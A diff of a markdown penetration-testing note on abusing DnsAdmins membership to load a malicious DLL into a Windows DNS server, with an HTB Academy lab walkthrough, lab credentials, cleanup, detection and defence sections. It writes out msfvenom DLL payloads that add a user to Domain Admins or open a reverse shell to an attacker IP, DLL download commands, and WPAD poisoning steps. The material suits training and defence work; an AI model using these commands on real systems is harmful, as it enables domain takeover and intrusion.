@@ -1,4 +1,4 @@
-# DnsAdmins Group Privilege Escalation
+# 🌐 DnsAdmins
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 🔧 Attack Mechanism
 
 ### DNS Plugin Architecture
+
 ```cmd
 # Key attack components:
 - DNS management performed over RPC
@@ -17,6 +18,7 @@
 ```
 
 ### Attack Flow
+
 1. **Generate malicious DLL** (msfvenom or custom code)
 2. **Host DLL** on accessible network share or local path
 3. **Configure ServerLevelPluginDll** registry key via dnscmd
@@ -27,6 +29,7 @@
 ## 🔍 Group Membership Verification
 
 ### Check DnsAdmins Membership
+
 ```powershell
 # Verify group membership
 Get-ADGroupMember -Identity DnsAdmins
@@ -40,6 +43,7 @@ SID               : S-1-5-21-669053619-2741956077-1013132368-1109
 ```
 
 ### Alternative Verification
+
 ```cmd
 # Check current user groups
 whoami /groups
@@ -51,6 +55,7 @@ INLANEFREIGHT\DnsAdmins                         Group S-1-5-21-669053619-2741956
 ## 💣 Custom DLL Generation
 
 ### Method 1: MSFVenom Payload
+
 ```bash
 # Generate user addition payload
 msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
@@ -64,6 +69,7 @@ Saved as: adduser.dll
 ```
 
 ### Method 2: Reverse Shell Payload
+
 ```bash
 # Generate reverse shell DLL
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f dll -o revshell.dll
@@ -73,6 +79,7 @@ nc -lnvp 443
 ```
 
 ### Method 3: Custom Mimilib.dll
+
 ```c
 // Modified kdns.c for command execution
 DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
@@ -91,7 +98,8 @@ DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRec
 ## 🌐 DLL Hosting and Delivery
 
 ### HTTP Server Method
-```bash
+
+````bash
 # Start Python HTTP server
 python3 -m http.server 7777
 
@@ -105,9 +113,10 @@ wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
 
 # Alternative with Invoke-WebRequest
 Invoke-WebRequest -Uri "http://10.10.15.152:1234/adduser.dll" -OutFile "C:\Users\netadm\Desktop\adduser.dll"
-```
+````
 
 ### SMB Share Method
+
 ```cmd
 # Host on SMB share accessible by Domain Controller machine account
 copy adduser.dll \\fileserver\share\adduser.dll
@@ -116,6 +125,7 @@ copy adduser.dll \\fileserver\share\adduser.dll
 ## 🔐 DNS Service Configuration
 
 ### Test Non-Privileged Access
+
 ```cmd
 # Attempt DLL loading as normal user (should fail)
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
@@ -127,6 +137,7 @@ Command failed: ERROR_ACCESS_DENIED
 ```
 
 ### Load DLL as DnsAdmins Member
+
 ```cmd
 # Configure custom DLL path (requires full path)
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
@@ -137,6 +148,7 @@ Command completed successfully.
 ```
 
 ### Alternative UNC Path
+
 ```cmd
 # Use network share path
 dnscmd.exe /config /serverlevelplugindll \\10.10.14.3\share\adduser.dll
@@ -147,6 +159,7 @@ dnscmd.exe /config /serverlevelplugindll \\10.10.14.3\share\adduser.dll
 ### Check Service Permissions
 
 #### Find User SID
+
 ```cmd
 # Get current user SID
 wmic useraccount where name="netadm" get sid
@@ -157,6 +170,7 @@ S-1-5-21-669053619-2741956077-1013132368-1109
 ```
 
 #### Analyze Service Permissions
+
 ```cmd
 # Check DNS service permissions using SDDL
 sc.exe sdshow DNS
@@ -168,6 +182,7 @@ D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CC
 ### Service Restart Sequence
 
 #### Stop DNS Service
+
 ```cmd
 # Stop DNS service
 sc stop dns
@@ -182,6 +197,7 @@ SERVICE_NAME: dns
 ```
 
 #### Start DNS Service
+
 ```cmd
 # Start DNS service (triggers DLL loading)
 sc start dns
@@ -195,6 +211,7 @@ SERVICE_NAME: dns
 ```
 
 ### Verify Privilege Escalation
+
 ```cmd
 # Check if user was added to Domain Admins
 net group "Domain Admins" /dom
@@ -211,13 +228,15 @@ Administrator            netadm
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Credentials**: `netadm:HTB_@cademy_stdnt!`
-- **Access Method**: RDP
-- **Objective**: Leverage DnsAdmins membership to escalate privileges and retrieve flag
+
+* **Credentials**: `netadm:HTB_@cademy_stdnt!`
+* **Access Method**: RDP
+* **Objective**: Leverage DnsAdmins membership to escalate privileges and retrieve flag
 
 ### Complete Step-by-Step Walkthrough
 
 #### 1. Connect to Target via RDP
+
 ```bash
 # Example target IP from HTB Academy
 xfreerdp /v:10.129.43.42 /u:netadm /p:'HTB_@cademy_stdnt!'
@@ -230,6 +249,7 @@ xfreerdp /v:10.129.43.42 /u:netadm /p:'HTB_@cademy_stdnt!'
 ```
 
 #### 2. Generate Malicious DLL (On Pwnbox/Attack Machine)
+
 ```bash
 # Generate DLL to add netadm to Domain Admins
 msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
@@ -244,6 +264,7 @@ Saved as: adduser.dll
 ```
 
 #### 3. Start HTTP Server for DLL Delivery
+
 ```bash
 # Start Python HTTP server on Pwnbox
 python3 -m http.server 7777
@@ -253,6 +274,7 @@ Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
 ```
 
 #### 4. Download DLL to Target (PowerShell)
+
 ```powershell
 # From RDP session, open PowerShell
 # Download adduser.dll using wget
@@ -270,6 +292,7 @@ d-r---        5/19/2021   1:38 PM                Videos
 ```
 
 #### 5. Configure DNS Plugin (Command Prompt)
+
 ```cmd
 # Open Command Prompt from RDP session
 # Load malicious DLL via dnscmd
@@ -281,6 +304,7 @@ Command completed successfully.
 ```
 
 #### 6. Restart DNS Service
+
 ```cmd
 # Stop DNS service
 sc stop dns
@@ -312,6 +336,7 @@ SERVICE_NAME: dns
 ```
 
 #### 7. Verify Privilege Escalation
+
 ```cmd
 # Check Domain Admins group membership
 net group "Domain Admins" /dom
@@ -327,6 +352,7 @@ The command completed successfully.
 ```
 
 #### 8. Sign Out and Reconnect
+
 ```bash
 # Sign out from current RDP session to refresh permissions
 # Reconnect with same credentials
@@ -336,6 +362,7 @@ xfreerdp /v:10.129.43.42 /u:netadm /p:'HTB_@cademy_stdnt!'
 ```
 
 #### 9. Access Administrator Desktop and Retrieve Flag
+
 ```cmd
 # Open Command Prompt with Domain Admin privileges
 # Access the flag file
@@ -348,21 +375,23 @@ type C:\Users\Administrator\Desktop\DnsAdmins\flag.txt
 
 1. **✅ DLL Generation**: 8704 bytes adduser.dll created successfully
 2. **✅ HTTP Server**: Python server serving on port 7777
-3. **✅ DLL Download**: adduser.dll present in C:\Users\netadm\
+3. **✅ DLL Download**: adduser.dll present in C:\Users\netadm\\
 4. **✅ Registry Configuration**: "Registry property serverlevelplugindll successfully reset"
 5. **✅ DNS Service Restart**: Both stop and start commands complete successfully
 6. **✅ Privilege Escalation**: netadm appears in Domain Admins group
-7. **✅ Administrator Access**: Can read files in C:\Users\Administrator\Desktop\DnsAdmins\
+7. **✅ Administrator Access**: Can read files in C:\Users\Administrator\Desktop\DnsAdmins\\
 
 ### Alternative Attack Methods
 
 #### Method A: Direct Administrator Access
+
 ```bash
 # Generate DLL for direct access
 msfvenom -p windows/x64/exec cmd='copy c:\Users\Administrator\Desktop\DnsAdmins\flag.txt c:\Users\netadm\Desktop\flag.txt' -f dll -o getflag.dll
 ```
 
 #### Method B: Service Account Technique
+
 ```bash
 # Generate DLL to enable RDP for netadm
 msfvenom -p windows/x64/exec cmd='net localgroup "Remote Desktop Users" netadm /add' -f dll -o rdp.dll
@@ -371,6 +400,7 @@ msfvenom -p windows/x64/exec cmd='net localgroup "Remote Desktop Users" netadm /
 ## 🧹 Cleanup and Restoration
 
 ### ⚠️ Important Considerations
+
 ```cmd
 # WARNING: This is a destructive attack
 - Only perform with explicit client permission
@@ -382,6 +412,7 @@ msfvenom -p windows/x64/exec cmd='net localgroup "Remote Desktop Users" netadm /
 ### Registry Cleanup
 
 #### Verify Registry Key
+
 ```cmd
 # Check if ServerLevelPluginDll key exists
 reg query \\[DC_IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
@@ -391,6 +422,7 @@ ServerLevelPluginDll    REG_SZ    adduser.dll
 ```
 
 #### Remove Registry Key
+
 ```cmd
 # Delete the malicious registry entry
 reg delete \\[DC_IP]\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
@@ -401,6 +433,7 @@ The operation completed successfully.
 ```
 
 ### Service Restoration
+
 ```cmd
 # Restart DNS service cleanly
 sc.exe start dns
@@ -415,6 +448,7 @@ SERVICE_NAME: dns
 ```
 
 ### DNS Functionality Test
+
 ```cmd
 # Test DNS resolution
 nslookup localhost
@@ -428,18 +462,21 @@ nslookup domain.com
 ### Global Query Block List Manipulation
 
 #### Disable Global Query Block
+
 ```powershell
 # Disable global query block list
 Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
 ```
 
 #### Create WPAD Record
+
 ```powershell
 # Add WPAD record pointing to attack machine
 Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
 ```
 
 #### Traffic Interception
+
 ```bash
 # Set up Responder for traffic capture
 responder -I eth0 -A
@@ -451,6 +488,7 @@ Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -Proxy Y
 ## 🔍 Detection Indicators
 
 ### Registry Monitoring
+
 ```cmd
 # Monitor for registry changes:
 HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
@@ -461,6 +499,7 @@ Event ID 4656 - Handle to object requested
 ```
 
 ### Service Activity
+
 ```cmd
 # Suspicious activities:
 - DNS service stops/starts outside maintenance windows
@@ -470,6 +509,7 @@ Event ID 4656 - Handle to object requested
 ```
 
 ### Network Indicators
+
 ```cmd
 # Traffic patterns:
 - HTTP requests for DLL files from Domain Controllers
@@ -480,6 +520,7 @@ Event ID 4656 - Handle to object requested
 ## 🛡️ Defense Strategies
 
 ### Group Membership Hardening
+
 ```cmd
 # Regular audits:
 - Review DnsAdmins group membership quarterly
@@ -489,6 +530,7 @@ Event ID 4656 - Handle to object requested
 ```
 
 ### DNS Service Protection
+
 ```cmd
 # Security measures:
 - Enable DNS audit logging
@@ -498,6 +540,7 @@ Event ID 4656 - Handle to object requested
 ```
 
 ### Detection Rules
+
 ```cmd
 # Deploy monitoring for:
 - DnsAdmins group modifications
@@ -509,33 +552,38 @@ Event ID 4656 - Handle to object requested
 ## 📋 DnsAdmins Exploitation Checklist
 
 ### Prerequisites
-- [ ] **DnsAdmins membership** verified
-- [ ] **DNS service permissions** confirmed (RPWP)
-- [ ] **Domain Controller access** available
-- [ ] **Client permission** obtained for destructive testing
+
+* [ ] **DnsAdmins membership** verified
+* [ ] **DNS service permissions** confirmed (RPWP)
+* [ ] **Domain Controller access** available
+* [ ] **Client permission** obtained for destructive testing
 
 ### DLL Generation
-- [ ] **Malicious DLL created** (msfvenom or custom)
-- [ ] **Payload tested** in lab environment
-- [ ] **Hosting method** prepared (HTTP/SMB)
-- [ ] **Full path** available for DLL specification
+
+* [ ] **Malicious DLL created** (msfvenom or custom)
+* [ ] **Payload tested** in lab environment
+* [ ] **Hosting method** prepared (HTTP/SMB)
+* [ ] **Full path** available for DLL specification
 
 ### Service Exploitation
-- [ ] **Registry key configured** (`dnscmd /config /serverlevelplugindll`)
-- [ ] **DNS service stopped** (`sc stop dns`)
-- [ ] **DNS service started** (`sc start dns`)
-- [ ] **Privilege escalation verified** (group membership/access)
+
+* [ ] **Registry key configured** (`dnscmd /config /serverlevelplugindll`)
+* [ ] **DNS service stopped** (`sc stop dns`)
+* [ ] **DNS service started** (`sc start dns`)
+* [ ] **Privilege escalation verified** (group membership/access)
 
 ### Flag Retrieval
-- [ ] **Administrator access** confirmed
-- [ ] **Flag file accessed** (`c:\Users\Administrator\Desktop\DnsAdmins\flag.txt`)
-- [ ] **Flag content** extracted and submitted
+
+* [ ] **Administrator access** confirmed
+* [ ] **Flag file accessed** (`c:\Users\Administrator\Desktop\DnsAdmins\flag.txt`)
+* [ ] **Flag content** extracted and submitted
 
 ### Cleanup
-- [ ] **Registry key removed** (ServerLevelPluginDll)
-- [ ] **DNS service restored** (clean restart)
-- [ ] **DNS functionality verified** (nslookup tests)
-- [ ] **Changes documented** for client reporting
+
+* [ ] **Registry key removed** (ServerLevelPluginDll)
+* [ ] **DNS service restored** (clean restart)
+* [ ] **DNS functionality verified** (nslookup tests)
+* [ ] **Changes documented** for client reporting
 
 ## 💡 Key Takeaways
 
@@ -548,6 +596,6 @@ Event ID 4656 - Handle to object requested
 7. **Multiple attack vectors** - user addition, reverse shells, WPAD attacks
 8. **Cleanup essential** - registry restoration and service stability
 
----
+***
 
-*DnsAdmins group privilege escalation represents one of the most powerful Windows built-in group attacks, capable of achieving Domain Admin privileges through DNS service manipulation.* 
+_DnsAdmins group privilege escalation represents one of the most powerful Windows built-in group attacks, capable of achieving Domain Admin privileges through DNS service manipulation._
